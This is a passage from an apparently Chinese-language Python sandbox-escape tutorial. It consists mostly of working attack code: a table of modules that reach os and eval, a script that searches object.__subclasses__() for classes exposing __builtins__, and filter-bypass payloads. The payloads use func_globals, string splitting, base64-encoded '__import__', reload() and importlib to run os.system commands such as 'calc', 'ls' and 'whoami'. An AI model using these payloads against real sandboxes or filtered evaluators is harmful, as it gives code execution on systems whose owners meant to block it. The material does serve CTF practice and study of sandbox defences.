                    'ftplib': ['sys', '__builtins__'], 'functools': ['__builtins__'], 'genericpath': ['os', '__builtins__'],
                    'getopt': ['os', '__builtins__'], 'getpass': ['os', 'sys', '__builtins__'],
                    'gettext': ['os', 'sys', '__builtins__'], 'glob': ['os', '__builtins__'],
                    'gzip': ['os', 'sys', '__builtins__', 'open'], 'hashlib': ['__builtins__'], 'heapq': ['__builtins__'],
                    'hmac': ['__builtins__'], 'imaplib': ['subprocess', 'sys', '__builtins__'], 'imghdr': ['__builtins__'],
                    'imp': ['os', 'importlib', 'sys', '__builtins__'],
                    'inspect': ['os', 'importlib', 'sys', '__builtins__'], 'io': ['__builtins__', 'open'],
                    'ipaddress': ['__builtins__'], 'keyword': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'],
                    'locale': ['sys', '__builtins__'], 'lzma': ['os', '__builtins__', 'open'],
                    'macpath': ['os', '__builtins__'], 'macurl2path': ['os', '__builtins__'],
                    'mailbox': ['os', '__builtins__'], 'mailcap': ['os', '__builtins__'],
                    'mimetypes': ['os', 'sys', '__builtins__'], 'modulefinder': ['os', 'importlib', 'sys', '__builtins__'],
                    'netrc': ['os', '__builtins__'], 'nntplib': ['__builtins__'], 'ntpath': ['os', 'sys', '__builtins__'],
                    'nturl2path': ['__builtins__'], 'numbers': ['__builtins__'], 'opcode': ['__builtins__'],
                    'operator': ['__builtins__'], 'optparse': ['os', 'sys', '__builtins__'],
                    'os': ['sys', '__builtins__', 'open'], 'pathlib': ['os', 'sys', '__builtins__'],
                    'pdb': ['os', 'sys', '__builtins__'], 'pickle': ['codecs', 'sys', '__builtins__'],
                    'pickletools': ['codecs', 'sys', '__builtins__'], 'pipes': ['os', '__builtins__'],
                    'pkgutil': ['os', 'importlib', 'sys', '__builtins__'],
                    'platform': ['os', 'platform', 'subprocess', 'sys', '__builtins__'],
                    'plistlib': ['os', 'codecs', '__builtins__'], 'poplib': ['__builtins__'],
                    'posixpath': ['os', 'sys', '__builtins__'], 'pprint': ['__builtins__'],
                    'profile': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'],
                    'pty': ['os', 'sys', '__builtins__'],
                    'py_compile': ['os', 'importlib', 'sys', '__builtins__', 'compile'],
                    'pyclbr': ['importlib', 'sys', '__builtins__'],
                    'pydoc': ['os', 'platform', 'importlib', 'sys', '__builtins__'], 'queue': ['__builtins__'],
                    'quopri': ['__builtins__'], 'random': ['__builtins__'], 're': ['__builtins__', 'compile'],
                    'reprlib': ['__builtins__'], 'rlcompleter': ['__builtins__'],
                    'runpy': ['importlib', 'sys', '__builtins__'], 'sched': ['__builtins__'],
                    'secrets': ['os', '__builtins__'], 'selectors': ['sys', '__builtins__'],
                    'shelve': ['__builtins__', 'open'], 'shlex': ['os', 'sys', '__builtins__'],
                    'shutil': ['os', 'sys', '__builtins__'], 'signal': ['__builtins__'],
                    'site': ['os', 'sys', '__builtins__'], 'smtpd': ['os', 'sys', '__builtins__'],
                    'smtplib': ['sys', '__builtins__'], 'sndhdr': ['__builtins__'], 'socket': ['os', 'sys', '__builtins__'],
                    'socketserver': ['os', 'sys', '__builtins__'], 'sre_compile': ['__builtins__', 'compile'],
                    'sre_constants': ['__builtins__'], 'sre_parse': ['__builtins__'], 'ssl': ['os', 'sys', '__builtins__'],
                    'stat': ['__builtins__'], 'statistics': ['__builtins__'], 'string': ['__builtins__'],
                    'stringprep': ['__builtins__'], 'struct': ['__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'],
                    'sunau': ['__builtins__', 'open'], 'symbol': ['__builtins__'], 'symtable': ['__builtins__'],
                    'sysconfig': ['os', 'sys', '__builtins__'], 'tabnanny': ['os', 'sys', '__builtins__'],
                    'tarfile': ['os', 'sys', '__builtins__', 'open'], 'telnetlib': ['sys', '__builtins__'],
                    'tempfile': ['__builtins__'], 'textwrap': ['__builtins__'], 'this': ['__builtins__'],
                    'threading': ['__builtins__'], 'timeit': ['timeit', 'sys', '__builtins__'], 'token': ['__builtins__'],
                    'tokenize': ['sys', '__builtins__', 'open'], 'trace': ['os', 'sys', '__builtins__'],
                    'traceback': ['sys', '__builtins__'], 'tracemalloc': ['os', '__builtins__'],
                    'tty': ['os', '__builtins__'], 'turtle': ['sys', '__builtins__'], 'types': ['__builtins__'],
                    'typing': ['sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'],
                    'uuid': ['os', 'sys', '__builtins__'], 'warnings': ['sys', '__builtins__'],
                    'wave': ['sys', '__builtins__', 'open'], 'weakref': ['sys', '__builtins__'],
                    'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'], 'xdrlib': ['__builtins__'],
                    'zipapp': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'importlib', 'sys', '__builtins__']}
    target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']
    target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']
    all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))
    all_modules = list(set(list(find_modules.keys()) + target_modules))
    subclasses = ().__class__.__bases__[0].__subclasses__()
    sub_name = [s.__name__ for s in subclasses]
    # 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()
    print('----------1-----------')
    for i, s in enumerate(sub_name):
        for f in all_targets:
            if f == s:
                if f in target_functions:
                    print(i, f)
                elif f in all_modules:
                    target = find_modules[f]
                    sub_dict = subclasses[i].__dict__
                    for t in target:
                        if t in sub_dict:
                            print(i, f, target)
    print('----------2-----------')
    # 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
    for i, sub in enumerate(subclasses):
        try:
            more = sub.__init__.__globals__
            for m in all_targets:
                if m in more:
                    print(i, sub, m, find_modules.get(m))
        except Exception as e:
            pass
    print('----------3-----------')
    # 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')
    for i, sub in enumerate(subclasses):
        try:
            more = sub.__init__.__globals__.values()
            for j, v in enumerate(more):
                for f in all_targets:
                    try:
                        if f in v:
                            if f in target_functions:
                                print(i, j, sub, f)
                            elif f in all_modules:
                                target = find_modules.get(f)
                                sub_dict = v[f].__dict__
                                for t in target:
                                    if t in sub_dict:
                                        print(i, j, sub, f, target)
                    except Exception as e:
                        pass
        except Exception as e:
            pass
    print('----------4-----------')
    # 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")
    # 类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似
    for i, sub in enumerate(subclasses):
        try:
            more = sub()._module.__builtins__
            for f in all_targets:
                if f in more:
                    print(i, f)
        except Exception as e:
            pass
# 防御绕过
## 过滤`__globals__`
当`__globals__`被禁用时，
  * 可以用func_globals直接替换；
  * 使用`__getattribute__('__globa'+'ls__')`
    # 原型是调用__globals__
    ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')
    # 如果过滤了__globals__，可直接替换为func_globals
    ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['__builtins__']['__import__']('os').system('calc')
    # 也可以通过拼接字符串得到方式绕过
    ''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")['__builtins__']['__import__']('os').system('calc')
## base64编码
对关键字进行base64编码可绕过一些明文检测机制：
    >>> import base64
    >>> base64.b64encode('__import__')
    'X19pbXBvcnRfXw=='
    >>> base64.b64encode('os')
    'b3M='
    >>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')
    0
## reload()方法
某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法：
    >>> __builtins__.__dict__['eval']
    >>> del __builtins__.__dict__['eval']
    >>> __builtins__.__dict__['eval']
    Traceback (most recent call last):
      File "", line 1, in 
    KeyError: 'eval'
    >>> reload(__builtins__)
    >>> __builtins__.__dict__['eval']
    ]`的方法间接访问模块b
例子1
    import re,sys
    pattern  = re.compile('import\s+(os|subprocess)')
    match = re.search(pattern,sys.args[1])
    if match:
        print "forbidden module import detected"
        raise Exception
要执行shell命令,必须引入 os/commands/subprocess这几个包,  
对于攻击者来说,改如何绕过呢,
必须使用其他的引入方式
    __import__函数 #动态加载类和函数
    importlib库
`__import__`函数
    test = __import__("os")
    print test.system('whoami')
importlib库
    import importlib
    test= importlib.import_module("os")
    print(test.system("whoami"))
参考文章：  